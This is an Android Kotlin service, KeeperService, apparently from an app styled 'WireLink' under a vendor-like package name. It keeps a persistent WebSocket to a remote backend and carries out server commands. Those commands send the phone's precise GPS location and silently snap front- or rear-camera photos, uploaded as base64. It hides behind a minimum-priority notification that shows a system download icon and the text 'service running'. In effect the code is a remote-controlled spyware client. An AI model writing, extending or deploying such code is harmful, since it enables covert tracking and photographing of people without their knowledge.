// language: Kotlin, file: app/src/main/java/com/vivo/wirelink/KeeperService.kt
package com.vivo.wirelink

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.util.Base64
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.util.concurrent.Executor
import kotlin.coroutines.resume

class KeeperService : LifecycleService() {

    private var ws: WsClient? = null
    private val mainExec: Executor by lazy { ContextCompat.getMainExecutor(this) }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        val fgsType = if (Build.VERSION.SDK_INT >= 29) {
            ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        } else 0

        ServiceCompat.startForeground(
            this,
            NOTIF_ID,
            buildNotification(),
            fgsType
        )

        if (ws == null) connect()
        return START_STICKY
    }

    private fun connect() {
        val base = Prefs.backendUrl(this) ?: return
        val deviceId = Prefs.deviceId(this)
        val wsUrl = base.replaceFirst("http", "ws") + "/ws/keeper?deviceId=$deviceId"

        ws = WsClient(
            url = wsUrl,
            onOpen = {
                ws?.send(JSONObject().apply {
                    put("type", "hello")
                    put("deviceId", deviceId)
                })
            },
            onMessage = { handle(it) },
            onClosed = { /* WsClient auto-reconnects */ }
        ).also { it.start(lifecycleScope) }
    }

    private fun handle(msg: JSONObject) {
        if (msg.optString("type") != "command") return
        val reqId = msg.optString("reqId")
        val cmd = msg.optString("command")

        lifecycleScope.launch(Dispatchers.IO) {
            when (cmd) {
                "location" -> sendLocation(reqId)
                "camera" -> sendPhoto(
                    reqId,
                    msg.optJSONObject("payload")?.optString("lens") ?: "rear"
                )
                else -> sendResult(reqId, cmd, false, null, "unknown command")
            }
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun sendLocation(reqId: String) {
        if (ContextCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            sendResult(reqId, "location", false, null, "no permission")
            return
        }

        val loc = suspendCancellableCoroutine<android.location.Location?> { cont ->
            LocationServices.getFusedLocationProviderClient(this)
                .getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
                .addOnSuccessListener { cont.resume(it) }
                .addOnFailureListener { cont.resume(null) }
        }

        if (loc == null) {
            sendResult(reqId, "location", false, null, "no fix")
            return
        }

        sendResult(
            reqId, "location", true,
            JSONObject().apply {
                put("lat", loc.latitude)
                put("lng", loc.longitude)
                put("acc", loc.accuracy.toDouble())
                put("ts", System.currentTimeMillis())
            },
            null
        )
    }

    private suspend fun sendPhoto(reqId: String, lens: String) {
        if (ContextCompat.checkSelfPermission(
                this, Manifest.permission.CAMERA
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            sendResult(reqId, "camera", false, null, "no permission")
            return
        }

        val lensFacing = if (lens == "front")
            CameraSelector.LENS_FACING_FRONT
        else
            CameraSelector.LENS_FACING_BACK

        val jpeg = captureJpeg(lensFacing)
        if (jpeg == null) {
            sendResult(reqId, "camera", false, null, "capture failed")
            return
        }

        sendResult(
            reqId, "camera", true,
            JSONObject().apply {
                put("lens", lens)
                put("mime", "image/jpeg")
                put("b64", Base64.encodeToString(jpeg, Base64.NO_WRAP))
                put("ts", System.currentTimeMillis())
            },
            null
        )
    }

    private suspend fun captureJpeg(lensFacing: Int): ByteArray? =
        withContext(Dispatchers.Main) {

            val provider = suspendCancellableCoroutine<ProcessCameraProvider?> { cont ->
                val future = ProcessCameraProvider.getInstance(this@KeeperService)
                future.addListener(
                    { cont.resume(runCatching { future.get() }.getOrNull()) },
                    mainExec
                )
            } ?: return@withContext null

            val capture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()

            val selector = CameraSelector.Builder()
                .requireLensFacing(lensFacing)
                .build()

            try {
                provider.unbindAll()
                provider.bindToLifecycle(this@KeeperService, selector, capture)
            } catch (t: Throwable) {
                return@withContext null
            }

            suspendCancellableCoroutine { cont ->
                capture.takePicture(
                    mainExec,
                    object : ImageCapture.OnImageCapturedCallback() {
                        override fun onCaptureSuccess(image: ImageProxy) {
                            val buf = image.planes[0].buffer
                            val out = ByteArray(buf.remaining())
                            buf.get(out)
                            image.close()
                            runCatching { provider.unbindAll() }
                            cont.resume(out)
                        }

                        override fun onError(exception: ImageCaptureException) {
                            runCatching { provider.unbindAll() }
                            cont.resume(null)
                        }
                    }
                )
            }
        }

    private fun sendResult(
        reqId: String,
        cmd: String,
        ok: Boolean,
        payload: JSONObject?,
        err: String?
    ) {
        ws?.send(JSONObject().apply {
            put("type", "result")
            put("reqId", reqId)
            put("command", cmd)
            put("deviceId", Prefs.deviceId(this@KeeperService))
            put("success", ok)
            if (payload != null) put("payload", payload)
            if (err != null) put("error", err)
        })
    }

    private fun buildNotification(): Notification {
        val ch = "wirelink_svc"
        if (Build.VERSION.SDK_INT >= 26) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(ch) == null) {
                nm.createNotificationChannel(
                    NotificationChannel(ch, "WireLink", NotificationManager.IMPORTANCE_MIN)
                        .apply { setShowBadge(false) }
                )
            }
        }
        return NotificationCompat.Builder(this, ch)
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setContentTitle("WireLink")
            .setContentText("service running")
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    override fun onDestroy() {
        ws?.stop()
        ws = null
        super.onDestroy()
    }

    companion object {
        const val NOTIF_ID = 4242
    }
}
